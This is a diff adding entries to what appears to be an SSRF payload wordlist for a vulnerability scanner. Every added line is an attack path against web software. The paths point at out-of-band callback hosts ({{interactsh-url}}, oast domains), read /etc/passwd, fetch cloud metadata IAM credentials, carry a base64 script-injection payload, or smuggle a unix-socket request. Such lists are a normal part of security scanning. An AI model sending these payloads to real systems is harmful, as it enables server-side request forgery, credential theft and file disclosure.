@@ -29,3 +29,17 @@
 /wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://{{interactsh-url}}
 /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://{{interactsh-url}}
 /shindig/gadgets/proxy?container=default&url=http://oast.pro
+/getFavicon?host=http://oast.fun/
+/wp1/home-18/?qtproxycall=https://{{interactsh-url}}
+/log_proxy?url=http://{{interactsh-url}}
+/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23
+/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23
+/filex/read-raw?url=http://oast.me&cut=1
+/?p=3232&wp_automatic=download&link=file:///etc/passwd
+//libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=https://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/app/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=http://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/api/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet.a.11.htm.svg?url=http://aws.osoro.zip/latest/meta-data/iam/security-credentials/ManagedServicesBigBearInstance&23/apil.omniture.com/a&q=a
+/api/v1/fetch
+/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc
+/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
+/html/usr/share/php/magpierss/scripts/magpie_debug.php%3furl=http://{{interactsh-url}}&ooo
